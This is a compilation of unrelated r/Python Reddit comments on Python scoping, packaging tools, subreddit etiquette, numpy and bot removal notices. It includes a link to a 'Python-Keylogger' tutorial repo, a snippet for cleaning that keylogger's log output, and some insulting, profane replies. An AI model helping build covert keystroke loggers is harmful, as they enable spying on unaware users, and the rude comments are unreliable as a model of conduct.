&gt; Closures and functions don't expose their scope as a namespace. That is true, but remember my earlier comment when I described my concept of namespace objects as being like modules, except they don't need a separate file on disk. Modules are a kind of namespace. My comment about closures and functions was relating to how they resolve names, not whether they expose their local variables to the outside. (That would totally defeat the purpose of locals.) When you write a function in a module namespace, you don't have to explicitly qualify your non-locals, globals or bultins. We **don't** write this: a = 1 def func(): b = 2 def inner(): builtins.print(nonlocals.b + globals.a) and it would be tiresome if we had to do this all the time. Now change the module to one of these proposed namespace objects, and the body of the function shouldn't need to change. From this perspective, classes and instances are the odd case, for reasons explained in the FAQs. Even if you disagree with those reasons, backwards compatibility means we're stuck with it until Python 5000. And we certainly shouldn't add more constructs that behave like classes unless we really need to. &gt; Classes and objects do. Only because Python has no enforcement of "private" attributes. If it did, we'd say that classes and instances expose *some* attributes but not others. &gt; And the idea of lexical scopping is that bindings depend on the definition context. If a function is defined in the context of a class, it would be natural for the class to create a scope, and for variable references in functions defined in that scope to also be resolved in that scope. "Natural" or not, classes are treated specially in Python and are a frequent cause of issues. Try this: a = 'global' class C: a = 'class' print( [c.upper() for c in a] ) print( [c.upper() for i in (1,) for c in a] ) and tell me if you can explain why you get the results you do :-) &gt; What you linked doesn't actually address that. The usage of self is a different issue. Then I don't understand your question. 
Most users in this subreddit aren't competent enough to be called that, yes. If you read threads like "what are you working on this week" or polls about everyone's expertise, you'll see that most people in this subreddit either aren't programmers at all, or are aspiring programmers, or entry level kind, or some glorified IT working on an e-commerce websites. Other arguments about pyinstaller and cxfreeze: all I can tell you, again, you have no clue of what you are talking about. 1. These tools don't work for anything but hello-world, on Windows. They are total garbage. 2. These tools are an indication that the problem exists and is very real, to the point that people would independently try and come with some sort of a solution. 3. Dropbox has a small part of its code written in Python (so far), afaik, they are planning (or maybe already did) get rid of it. Their compilation and installation process is anything but trivial, and requires a lot of work from their ops and IT. (I know this because a guy I used to work with now works for them). BitTorrent is the same: small Python bindings around library written in C++ with a lot of custom code written in order to be able to install this program on user's PC. I never used Google's drive, but I'm sure that their client program had to go through the same painful process as the rest. There's no avoiding it.
Sorry you got down voted, but my suggestion would be to Google your problem. If you want to download YouTube videos, ask yourself whether this is likely a common problem. Billions of people use YouTube. This is a very common problem, and one with numerous solutions. A quick search will demonstrate that there are multiple easy ways to download YouTube videos (websites, browser plugins, mobile apps, desktop applications, modules for python and other programming languages, etc). This is all besides the fact that these videos are unlikely to be removed since they are part of a long-running, well-supported service. Finally, if this did go away, the internet will still be chock full of more computer science resources than anyone could ever watch or read. It's a great time to be alive and love code!
I'm not saying "never use notebooks" or "you should forget what you learned about notebooks". I'm saying expand your knowledge. Learn how to use a text editor to write Python code in a `.py` file, and how to run it from the desktop or command line. Every mainstream desktop OS supports running code from files, if you have the Python interpreter installed. 
Your submission has been automatically removed. Your reddit account must be older than 2 weeks before you can post. No exceptions. You can repost this when your account is old enough. This helps prevent spam. **If you need help with Python** see r/learnpython or r/learnprogramming. **WARNING** Reposting this under a different account before 2 weeks risks getting both accounts banned as well as domains in the post. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/Python) if you have any questions or concerns.*
Jesus christ instead of admitting you're wrong you're just deciding to say "the things you say are incorrect because I said so and I know better than you and the tools you mention are garbage because I said so". And continue to be rude and high and mighty over an entire community! And your third point is speculation of "I know a guy who knows a guy" with actually easily provable incorrect statements from Dropbox and Bittorrent themselves. Have a good day man. You're completely off your rocker.
Make a post on stackoverflow
I had a problems when i ran "make html". It tells me that i didn't have latex installed. It's weird right? Yesterday my friend guide me to document my code. It worked. But i still don't understand why i had such problems before. Thanks for answering my questions mate.
Your submission has been automatically removed. Your reddit account must be older than 2 weeks before you can post. No exceptions. You can repost this when your account is old enough. This helps prevent spam. **If you need help with Python** see r/learnpython or r/learnprogramming. **WARNING** Reposting this under a different account before 2 weeks risks getting both accounts banned as well as domains in the post. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/Python) if you have any questions or concerns.*
PyCharm, hands down
Working on the python helper bot. I just got a function mostly running to help reformat redditors code. That way when new users post a question with some of their code, it can reformat it so it's easier to read. I plan on only commenting with reformatted posts with code when the bot has been summoned to do so and that feature might not be added for a while, but the function is important for a lot of future functions: namely helping with automatic question and answering. Sectioning out example code from the user question will help match the user question to stack overflow questions, and the code to SO code, increasing the chance that an accurate match can be found. Now that the reformat function is working in a proof of concept capacity, I'll add it into the bots modules and continue work on reorganizing the program around custom classes for reddit submissions, comments, and users. This should both decrease the frequency that the bot dies because of an unexpected networking issue, and simplify post archiving for the creation and update of the python v.s. learnpython training database. Most of this week will be spent just reorganizing code. 
You are an idiot. 
in addition to vids
python 🚀
"great work, bro! awesome job!" &amp;#x200B; DOWNVOTE &amp;#x200B; lol. programmers.
Please, don’t be a dick. Be nice to OP. Let OP share however he/she wants in a way he/she feels right
Oh okay I didn't know that it would work ^^ thanks a lot !
Yeah I didn't think about that ^^
Just finished writing my AD authentication save and load methods my a flask app that I'm working on. Went well, just AD is such a pain to use especially when the setup probably hadn't followed best practices because I had to modify the save and load methods, so I could is the @login\_required decorator in all my views. Have a bit of down time, and will probably run through Python, The Tricks Book from Dan Bader until our year picks up again. If anyone needs help with flask hit me up :) 
Low-effort link posts that just are there to create attention to externally hosted material does not bring any value to /r/Python. 
Regardless, we don’t know that. But we can see OP commenting and stuff. I guess that’s a good content contributor. A benefit of doubt. But i am just saying, there’s no need to be rude especially in comment section shown in link example. 
Who exactly needed to downvote OP for this? 
if you think people are being rude and "dicks" in /r/Python you should check /r/PHP This is one of the nicest and supportive communities I have ever seen on reddit
Being critical is not the same as being a dick. 
"low effort" posts is a phrase invented so programmers can be pretentious and demeaning. In such an objective science, that is a particularly subjective standard to base so much of you conduct off of. To me, it's just a license to be a dick. This isn't github. This is reddit.
I don’t think op is condoning low effort content but rather not being a dick to someone who just started programming. 
There are some great YouTube videos. This is one of them. https://youtu.be/VUvEDg30FyY 
that's because they're all 40's ++ lol
How much effort is put into posting a link? Had the poster made at text post explaining why we should watch the video, there would have been an effort. But this is just spam. 
Yeah, didn't really find the material in the example post to be dickish. &gt; I really wish people would stop making videos and instead write an article linked to a github repo. That sounds like actually OK feedback.
Why do you think he/she is being a dick? Whether or not you agree, that was a valid criticism and was by no means offensive. It wasn't even directed at OP.
Expressing a preference for articles is not being a dick. Criticizing videos isn't dickish either. For some reason some communities have this culture where nothing but 'GOOD JOB LITTLE BUDDY!' is tolerated. 
BY THE WAY: This kid has put in A LOT of work into these videos. They are EXTREMELY high quality. I guarantee his channel will have hundreds of thousands og subscribers, if not more, if he keeps at it. I say this because I was legitimately impressed with his ability to explain concisely and cut out the fluff. Not to mention, the poster is just a clearly good, fun-loving person just trying to help. I don't know if it's jealously or what - but you should be ashamed of yourselves if youtreated this poster in a degrading way. &amp;#x200B;
My question exactly, brother. Dicks. That's who.
Whats the other two publishers? Just interested since i also love Manning books and would love to know of any other quality publishers out there.
Me too. I enjoyed the videos. It was impressive. But the comment section was just kinda degrading. I just hope the poster doesn’t get discouraged. A constructive feedback would be nice. Or maybe help instruct the OP to make an github with the source instead. 
[Relevant XKCD](https://xkcd.com/353/) 
Cool. It would be nice to put video count number at relative position in YouTube thumbnails. Right now its fixed at the centre. 1 should be at the top and so 8 should be at bottom. That would be nice to look
one of my omments on Youtube is pinned. I raved abotu him. Great material on really cool topics. one of my comments on Youtube is pinned. I raved abotu him. Great material on really cool topics.ry well done.
Ah interesting. That's sounds creative.
I would guarantee you would have slighted him for that as well. "WTF, bro. Shit post cramming all this garbage that's already in your videos" Not like he has references. Proof "quality" and effort are in the videos.
&gt; linked to a github repo IMHO this would be enough. Good video lecture is fine if backed by a real code. Only if the quality of the video is lacking (bad sound, improper voice acting, unreadably small font used etc.) I'd voice my concern.
Or provide an instruction to make github account, pastebin link or something similar. Perhaps, OP don’t know how. We should be showing the way of how it’s done. 
I don't care about the quality of the video. I care for the quality of what's posted on this subreddit. Strike two for your psychic abilities. 
That’s my point. 
forget it man. Cosider whethr you can afford to let some of the negatives go and focus on the positives. Even mention the nagatives with the positives would be an upgrade. Or ignore. Don't just bring out the negative. No need for that.
Fuck off, OP. Don't make me read your goddamn wall of text. If you've got something to say, make a goddamn video.
Thank you, I don't give a rat's ass about some fucking Hello World program.
I get surprised daily by people who are very young but somehow think they are old, f\*\*\*k reality TV shows that keep telling us 25 is too old. 37 is still young. I'll be 56 in April, no CS degree but with a BSc in Geomatics . Got into "web development" in 2007 (age 44) by learning Joomla in order to have some geographic data online for a client overseas. I then figured that i need to learn web dev proper instead of fiddling around with templates and plugins, so i got into HTML/CSS/JS and PHP. Over the years, i have learned Ruby, RoR, relearned PHP(back then resources were limited), Laravel, Python and several JS frameworks. I am currently learning Dart and Flutter. I have a small (8yrs) web dev studio supporting over 300 clients and with 6 employees offering solutions from web development, data analysis, social media analytics, BI etc. There is no learning that goes to waste.
The language benefits in some way from the sub being popular. At least in academic studies, I’ve seen popularity on places like Reddit and search history used as an indicator of general use, and I assume that there would be a positive feedback loop there. People posting original Python content might be so common as to dismiss with a “peh” now, but it’s not guaranteed to stay like that. Why not be welcoming?
How about spammers such as /u/antaloaalonso?
Calling programming a *science* might be a tad of a stretch there 
Where in &gt;News about the dynamic, interpreted, interactive, object-oriented, extensible programming language Python do you read that the purpose of this sub is to hand out participation medals, lest pretend that making the language the next target for boot camp scams, are helpful in the grand scheme of things?
Computer science, bro. It's 100% a science.
&gt; Another reason is because, for each iteration of the loop, Python has to lookup the `__iter__` or `__getitem__` method, and then call it. That is not true: &gt;&gt;&gt; class loudlist(list): ... def __getitem__(self, item): ... print('__getitem__') ... return super().__getitem__(item) ... def __iter__(self): ... print('__iter__') ... return super().__iter__() ... &gt;&gt;&gt; [x for x in loudlist([1,2,3])] __iter__ [1, 2, 3]
I'm with you halfway, but... &gt; That actually sounds like OKish feedback. Now I personally hate tutorial videos, and think it's an awful format. But clearly a lot of people disagree. It seems silly and useless to say that it's in the "wrong format" when that's clearly popular and not against the rules. Like if someone asks how I like their pizza, I might tell them the sauce is too runny, but I'm not going to say that I prefer pasta. Better feedback would be like "I didn't watch because there's no GitHub link," or "I can't understand what you're saying," or "regex really isn't the best way to parse HTML." 
Ok, I think you're being extremely sensitive and childish. The comment section there wasn't even bad, you're making a big deal out of nothing.
Hey, I'm 40+ and I'm here.
Given how much I've seen people police posts because questions belong on /r/learnpython, I'm not exactly sure what should be posted here at all if we also can not post links to external content.
I don't see a demeaning comments in that post. I think you are acting like a big whinny baby. Most of the comments are positive and supportive.
The way things are written is important 
Programming has a bit of subjectivity, but no, that's not a license to treat people like crap, and pretentiousness in programming can sometimes actually motivate people to write bad code.(Case in point: "Performance doesn't matter, what matters is progammer time and clean code. See? I have a callback that returns a promise that gets passed to another callback that calls another one when the promise resolves! Beautiful! No better way to append a string!") Sometimes posts are annoying, but if they're not active major nuisances, it's probably just beginners exited about what they did who haven't learned git fully yet. No reason to chase them away to the far reaches of Java Land. Maybe some constructive criticism is in order? Code is rarely perfect, and usually works well enough, and usually has a security bug or two and some ugly parts or missing features, and we all argue about which ones are the worst. There's code that we all agree is just objectively terrible and belongs on thedailywtf, but your favorite libraries and languages probably have plenty of haters. I know mine do!
And I respect my elders! Just as long as it goes both ways :)
Yes. To find out how, please ask in /r/learnpython 
Hello! I'm a bot! I see someone has already suggested going to r/learnpython, a sub geared towards questions and learning more about python. I highly recommend posting your question there. Please follow the subs rules and guidelines when you do post there, it'll help you get better answers faster. Show /r/learnpython the code you have tried and describe where you are stuck. **[Be sure to format your code for reddit](https://www.reddit.com/r/learnpython/wiki/faq#wiki_how_do_i_format_code.3F)** and include which version of python and what OS you are using. You can also ask this question in the r/Python discord: https://discord.gg/3Abzge7, a large, friendly community focused around the Python programming language, open to those who wish to learn the language or improve their skills, as well as those looking to help others. *** [^(README)](https://github.com/CrakeNotSnowman/redditPythonHelper) ^(|) [^(FAQ)](https://github.com/CrakeNotSnowman/redditPythonHelper/blob/master/FAQ.md) ^(|) ^(this bot is written and managed by /u/IAmKindOfCreative) ^(This bot is currently under development and experiencing changes to improve its usefulness)
Ah, true, I'm showing my roots from learning in the pre-iterator days. I actually meant \_\_next\_\_ rather than \_\_iter\_\_.
You can't say "not be a python" on r/python - that's impossible.
I guess there's a feelings-fighter in every crowd. (!) I'm seeing the buzzwords and loaded words come out --- _toxic_, _dick_, _bro_ (down in the comments). It's pretty clear to see where this is going. :-P You people are disgusting white brogrammers. Check your privilege. /s This rant and resulting drama is over one bland comment on a successful post. It has hundreds of upvotes and is appreciated. Some people won't appreciate it. That's fine too. They can even say so out loud - that's freakin' awesome. Geez, we're not all so fragile. Critique and feedback is good.
Some people prefer a 10 minute video over a 10 minute read. So "also write an article" is valid feedback. But, "stop making videos because articles are better" is not.
"Old" age and no degree are not a factor. What **is** a factor is your motivation to become a software dev: to get away from physical work. Software development is too difficult and consuming to be successful for that reason alone. It's like the decision to move to NYC. You have to **really want** to live there. Otherwise, like people I know, NYC will give you the hint, "Go on, leave, you don't really want to be here..." It's way too difficult if you're not _driven_. **My advice** as a 50-year-old senior developer: You've got the books and courses and are "ready" to hit them hard... Knock that BS off: hit them now. Not "hard", but at a pace that feels ok. And check in with yourself --- are you enjoying it? Is it stimulating? Or do you want to cut out your liver and eat it? Because welcome to the rest of your life if you choose to be a software developer --- this learning will never stop.
I agree somewhat. We shouldn't mollycoddle but there's classically a strange toxic environment when it comes to programming forums (looking at you SO). Be critical, but don't be shitty about it.
I agree with you, but hey, welcome to 21st century.
&gt;wElL It wOrKs oN My lOcAl And even the comment to that was certainly demeaning.
Yeah, it definitely could have been better! I just wouldn't call the writer out for being a dick. Maybe callous or even harsh, but not a dick. Another interesting thought on this: If it were a company, (which is more or less what YouTube content creators are) the feedback would be valued; they'd probably even *pay* for that kind of feedback as market research!
It could definitely been worded nicer and I can see how someone may not feel great getting that kind of feedback... but I read all the words carefully and still think it's a far cry to call someone out for being a dick. In a focus group setting, honest feedback like this would be super valuable to a company (which is, more or less, what YT content creators are) that produces content for the audience they advertised to.
I would like to see sess of [this](https://www.reddit.com/r/Python/comments/ac3oj4/python_in_one/). None if I could have my way.
Not being a dick is great and necessary for a civilized conversation. I don’t see the connection to the linked thread, though. I assume you’re talking about the “stop making videos” comment since you answered to that. Yes, it lacks more explanation to actually be *constructive*. But nobody is insulted anywhere. Nobody is attacked personally. I don’t see anything that resembles any kind of strong language. The bar for dickishness has to be quite a bit higher than a somewhat unhelpful comment in calm language. Otherwise wouldn’t we have to call out *you* as a dick as well? Shouldn’t you let the original commenter express their opinion in a way they feel is right? Imo that doesn’t lead anywhere but into major flamewars. Instead try to turn the unhelpful comment into something that *is* helpful to the OP. For example by asking the commenter to elaborate and provide an outline of your own reasons why video postings aren’t inferior to articles. If a comment is truely unacceptable, there’s the *Report* button for that.
Thank you so much. I am gonna keep at it. Actually I had just finished recording a Python Web Scraping using Scrapy video when I saw this post. Already recorded 12 videos 12 more to go!
This is how 90% of my programming conversations go and it never makes me mad!
I am not discouraged. I tried writing articles but I am not a natural at it. Just like sitting in front of the computer and recording stuff. BTW I have the source code. Forgot to attach it in the videos [https://github.com/attreyabhatt/Python-Keylogger](https://github.com/attreyabhatt/Python-Keylogger)
tbh packt books are to be avoided
Well I tried writing but I just don't enjoy it. I have always learned from videos and I like sitting in front of laptop and just start recording. I have the github repo in description of the videos though.
Yes
Thank you. But I am actually more interested in projects which can be looked up on github, so it is possible to dig into source code
Is it a complex thing to do? I've never done any python but want to learn by doing
That’s actually not completely true. There is an “object” type which can be used as a way to slice non-numpy objects. Not really sure the uses outside of that, but my guess is not much.
remindme! 6 months
I really like the diversity of posts we get. I'm slighly annoyed about r/learnpython leaking but it's no big deal. Python is the language with antigravity in its standard library and things like that are the reason some of us are here, instead of in javascript.
Complexity depends on how far you want/need to take the solution you intend to build and how much prior experience you have in developing software (in any language). 
The occasional handicraft is fine and adds to the enjoyment of the subreddit. 
It does. What’s really cool is when parsing binary data, you can have mixed into/floats/strings. You just interpret the data as a different type, slice it, and save it. It’s 200 or so times faster than using struct. Lists on the other hand use pointers to the values and there is another pointer on the value to the type. So for an integer list, you’d expect 3-6x more RAM usage depending on if you’re not using 32 or 64 bit integers. Chances are you can use 32 but integers with no issue.
Sometimes its not deliberate, and it just picks up their profile picture. You don't see it on the old reddit front-end.
One day there will be an ai in the sky granting our wishes. Import ai.GOD
r/learnpython
To users here, can we stop making threads about how we should tolerate flooding this sub with irrelevant content, spam, and beginners questions.
Oh, that makes a lot more sense.
Why was this downvoted
Google the Hitchhiker's Guide to Python there is a recommended list of pythonic projects to read the source of. You can find it under the section "reading great code" or something similar.
it is slow while opening..
I'm a bot, *bleep*, *bloop*. Someone has linked to this thread from another place on reddit: - [/r/learnmachinelearning] [Python Neural Network](https://www.reddit.com/r/learnmachinelearning/comments/ac5738/python_neural_network/) &amp;nbsp;*^(If you follow any of the above links, please respect the rules of reddit and don't vote in the other threads.) ^\([Info](/r/TotesMessenger) ^/ ^[Contact](/message/compose?to=/r/TotesMessenger))*
This is pretty easy, just set up a basic flask app. And then use post and get requests to work your script. You could also look at using dash (from plotly) to make something quickly, it used the flask framework. I can mock you something up in dash quickly if you want.
Absolutely. But your program will have to detect that the file has changed and re-read it.
in addition to it, the post reading is a very hard thing to implement. What normally happens is that you will reconfigure the application model as a single operation, but this operations are hardly atomic. The consequence of this is that some settings may step on each other if done together. This does not happen if you set the configuration model at startup and then open the application, because no change notification for the individual entries will be sent. The application reads the thing as a whole.
It's kinda like the difference between a slick production line, and some bespoke handmade one offs. Imagine your data is a range of different loafs of bread - granary, white brown etc. You're a bakery that wants to slice your bread into 25 slices. In a high volume factory AKA numpy because you specify the type e.g. pan loaf, the length each loaf is fixed you make a single stamp thing that can stamp a pan loaf into 25 perfect slices in one smack. Loading them up into the machine is easy, you just store them in the warehouse lined up end to end. When you want to slice them, just grab all the bread between the first and last loaf and shove them all through in quick succession, bamb bamb bamb, equally sliced bread! Python lists are your bespoke bakery, each loaf is an individual, different lengths etc. For every slice you've not only got to adjust your cutter, but you can't just line them up end to end in your warehouse, you need to keep track of where each loaf is in the warehouse and how long it is, and some poor sod has to fetch them individually. So by fixing the length of your bread (*ahem data) you can store it in a far more efficient manner, and more importantly you can optimize your tooling. But in exchange for that, you massively loose flexibility.
&gt; detect that the file has changed Through polling? Will that be resource intensive?
You can reimport anything at anytime. And also have your code reparse a file at any time. Then take action on the changes, so yep
You'd only have to get the modify date every few seconds. Shouldn't be too bad.
Oh, you'll absolutely have to do some planning and organize some things around this feature.
Thanks!
I like the video. Nice to see the output "live" as you test the code. Plus it's easy enough to rewind or pause to catch something if I missed it. &amp;#x200B; Great work!
and the new priests will be the ones who understand the api. And they will guard it secretly.
Hi OP, i love Tom Augspurger and PB Python from your list! I think those are the ones most directly applicable to me. By any chance would you know of any other blogs / resource that is in similar vein to this? thank you!
So I guess you could do an If for every special key.something to avoid clutter in the logfile. Isn't there an easier way to do it though? I was thinking something like adding all the Key.something where you want to not add any characters at all into a list and then simply check if the content of the letter variable is inside the list, and if so then append '' (blank) rather than the key.something. Otherwise the code is full of IF, IF, IF, IF... Wouldn't this work, example? bad_keys = ['Key.shift', 'Key.shift_r', 'Key.backspace'] if letter in badkeys: letter == ""
Sure, why learn how to do it yourself when you can copy someone else's code.
At a Python REPL: import antigravity 
something_complicated.do()
Damn this thread got downvoted to hell.
I think you mean google.com buddy
my question is why? They just literally shared an opinion, a guy that posted yesterday how a lot of people from this community are dickheads, he wasn't wrong...
Possibly look up 'Python Programming jobs, Toronto, Canada' and maybe that will work out?
This is really helpful. I'm seeing Bootstrap/Pelican projects as well. Buying a theme or using an open-source one would be a great way to save time. So far I'm getting the visualization I need with [MatPlotLib](https://matplotlib.org) but will take a look at Javascript offerings to see if I'm missing anything. I could see Javascript being interesting for web-based visualization.
I do think the `__next__` method is cached and not looked up every iteration, but you are right it's still a function call that has to happen every iteration. (I do wonder if calling a CPython function implemented in C still has to create a frame object?)
Yeah like wtf I don't see the problem here lmao
I came back online and went 'whoa' but no idea. I'm not a farmer so its no biggie. 
If you're a native English speaker, then x1.25 speed is probably better for you, since my English is, well, not the best.
Stack overflow has a ton of python job postings. 
/r/learnpython
I'm 21 and noticed the age thing years ago as well. The whole "you need to be an enthusiastic 17/18/whatever year old with big ideas ready to transform industry X if you want to have a shot at this" mentality gets annoying fast
It can be done in Python, but it might be better to look at pre-existing solutions (MS Excel, MS Project, SmartSheet, Zoho) before trying to reinvent the wheel.
It's my absolute favourite xkcd!
whats the bottomline: minified &amp; gzipped sized?
Managed to figure it out and answered my own question on Stack. Thanks for your help, without it I'd probably still be sitting here trying to figure out what's going on.
You probably actually want something that uses an inotify like API from the OS to be informed when a file changes. https://pythonhosted.org/watchdog/ is apparently cross-platform.
Oh, that punchline is golden.
Also sample everything in the medicine cabinet. 
Great! 
To users here, stop telling other people what to do. Don't be a totalitarian who wants to impose their sensitivities on others.
Noobs, npm install left-pad
Hi Umroayyar, I did the data load with pandas, cleaned my dataframe and convert the columns to the right format (object(str), float64). Now I have 4 colums left: Name, UserDepartment, ItemSize, ItemsCount I want to plot data per user and per service and display stats with any kind of histogram to display relevant information but I cannot manage to use the group\_by method. I have at least 1200 users with more than 3000 items (the limit I want to display) and it would be a bit messy with all that bars I guess. Heres a head() and a describe() of my DF, could you help me to use those data? &amp;#x200B; Name UserService ItemSize ItemsCount DateCreated ExtractionDate aaeb1 aaeb 532.210225 5497.0 2010-05-26 12:13:58 2018-12-12 aaeb2 aaeb 717.982454 4095.0 2010-05-26 12:13:58 2018-12-12 aaeb3 aaeb 918.782620 3672.0 2010-05-26 12:13:58 2018-12-12 afo12 env 413.872820 5618.0 2009-11-17 14:28:43 2018-12-12 ais32 sas 747.892366 10147.0 2009-11-17 14:21:15 2018-12-12 ItemSize ItemsCount count 7343.000000 7343.000000 mean 1628.003393 10249.050933 std 2574.212337 10836.675101 min 12.514386 3001.000000 25% 514.220265 4301.500000 50% 743.815005 6327.000000 75% 1660.374800 11326.000000 &amp;#x200B;
Yes, it should be. Then I have no more advice to offer, sorry.
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Nope. something is in the namespace, something_complicated isn’t. 
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Oooh, this might be exactly what I'm looking for. I just dipped my toe into Python last week after beating around the bush for years. I decided I wanted to do some analysis of weather data, and after doing one year's worth of data in a spreadsheet, I figured that if I wanted to do multiple years, I needed to move to a database instead, and that was the perfect opportunity to dive in head first to actually doing things with Python. After a week, I managed to get all my data imported and even calculated the way I wanted to... now I'm trying to figure out the best way to, for lack of a better term, organize and visualize the results, and I've sort of hit a brick wall, since I know next to nothing about statistical analysis. I'm definitely going to spend some time poking around here.
from something import complicated as something_complicated
As served by cdnjs : 133,73 kB for brython.min.js (the Python-to-Javascript translator and runtime scripts) ; 811,84 kB for the standard library. The transfer is done once, afterwards the files are in the browser cache.
Maybe to add something from a more technical perspective: Draft up on paper what you want the end product to look like, grab a random popular web framework and do their tutorial, mock up the front-end and start implementing. Although the sibling comment should not be discounted, this sounds like something that affects how people do their job. Don't use your colleagues as lab rats, try getting into it but look at existing solutions as well. Maybe you can add your fancy screen idea with the help of an API to existing software that's at least not bug ridden and does the heavy lifting for you.
We’re talking about programming. Not computer science. Bro.
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
Hi there, from the /r/Python mods. We have removed this post as it is not suited to the /r/Python subreddit proper, however it should be very appropriate for our sister subreddit /r/LearnPython or for the r/Python discord: https://discord.gg/3Abzge7. The reason for the removal is that /r/Python is dedicated to discussion of Python news, projects, uses and debates. It is not designed to act as Q&amp;A or FAQ board. The regular community is not a fan of "how do I..." questions, so you will not get the best responses over here. On /r/LearnPython the community and the r/Python discord are actively expecting questions and are looking to help. You can expect far more understanding, encouraging and insightful responses over there. **No matter what level of question you have, if you are looking for help with Python, you should get good answers**. Make sure to check out the rules for both places. Warm regards, and best of luck with your Pythoneering!
